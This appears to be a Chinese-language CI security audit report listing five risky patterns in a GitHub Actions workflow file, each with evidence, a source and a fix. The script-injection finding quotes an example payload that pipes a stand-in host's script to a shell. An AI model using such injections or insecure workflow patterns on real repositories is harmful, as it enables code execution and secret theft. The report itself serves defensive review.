· Action 未锁定版本（用 @main / @master）
位置 .github/workflows/bad.yml:10
证据 uses: actions/checkout@main
依据 GitHub Docs — Security hardening for GitHub Actions: pinning to a full-length commit SHA
建议 用 @main/@master 意味着 action 作者推送任何代码都会立刻在你的 CI 里执行 —— 上游被投毒时你就是受害者。改成完整 commit SHA（如 actions/checkout@8f4b7f8...），而不是 tag 或分支。
· workflow 权限设为 write-all
位置 .github/workflows/bad.yml:4
证据 permissions: write-all
依据 GitHub Docs — Assigning permissions to jobs：最小权限原则
建议 write-all 让该 workflow 里任何一步（含第三方 action）都能改仓库内容、发 release、改 settings。改成按需声明，例如 permissions: { contents: read }。
· 在 run 里直接输出 secrets
位置 .github/workflows/bad.yml:20
证据 echo "token=${{ secrets.
依据 GitHub Docs — Security hardening for GitHub Actions: 永远不要把 secrets 打印到日志
建议 echo "${{ secrets.X }}" 会把密钥写进构建日志 —— 日志可被有读权限的人看到、会被缓存、会进下载的日志包。改成写进环境变量并避免打印，或用 ::add-mask:: 主动打码。
· run 里直接插值外部可控输入（脚本注入）
位置 .github/workflows/bad.yml:15
证据 run: | echo "PR title: ${{ github.event.pull_request
依据 GitHub Security Lab《Script injections in GitHub Actions》—— 攻击者可通过 PR 标题/分支名注入 shell 命令
建议 ${{ github.event.pull_request.title }} 这类值由**外部贡献者可控**。直接插进 run 里，等于让陌生人往你的 shell 里写字（比如标题里放 `"; curl evil.sh|sh; "`）。改成先写进 env: 再引用 $VAR。

· 使用 pull_request_target 触发
位置 .github/workflows/bad.yml:3
证据 pull_request_target
依据 GitHub Docs — Events that trigger workflows: pull_request_target；GitHub Security Lab《Preventing pwn requests》
建议 pull_request_target 在**目标仓库上下文**运行，能拿到 secrets，且默认有写权限。若后续 checkout 了 PR 的代码（ref: github.event.pull_request.head.sha）并执行其中的脚本，外部贡献者可直接窃取 secrets。若只是打标签/评论、不 checkout PR 代码，则风险可控 —— 请人工确认。
